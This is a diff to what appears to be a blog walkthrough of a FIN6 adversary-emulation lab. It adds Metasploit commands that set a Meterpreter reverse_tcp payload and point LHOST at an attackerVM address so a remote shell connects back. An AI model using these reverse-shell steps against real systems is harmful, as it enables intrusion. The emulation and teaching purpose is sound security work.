@@ -76,10 +76,18 @@ msf6 exploit(multi/handler) > show options
 
 ![]({{site.baseurl}}/assets/img/2023-08-02-FIN6 Adversary Emulation - Phase 1/2023-08-02-Metasploit_MsfConsole_Show_Options.png){:width="100%"}
 
-As youn can see, the payload is currently set to default `generic/shell_reverse_tcp`. We now need to configure the payload and exploit appropriately, so the Meterpreter shell can connect back to our attackerVM machine. In this case, we need to inform the exploit handler for the type of the payload that we generated, in this case:
+As youn can see, the payload is currently set to default `generic/shell_reverse_tcp`. We need to configure the payload and exploit appropriately, so the Meterpreter shell can connect back to our attackerVM machine. In this case, we need to inform the exploit handler for the type of the payload that we generated:
 
 ```bash
 msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
+```
+
+Aside from, we can also see that LHOST needs to be set. We don’t need to set LPORT because it already matches the option we set for the payload.
+
+We can set the LHOST option with the following command:
+
+```bash
+set LHOST <attackerVM_ip_address>
 ```
 
 ## Step 2 - FIN6 Discovery
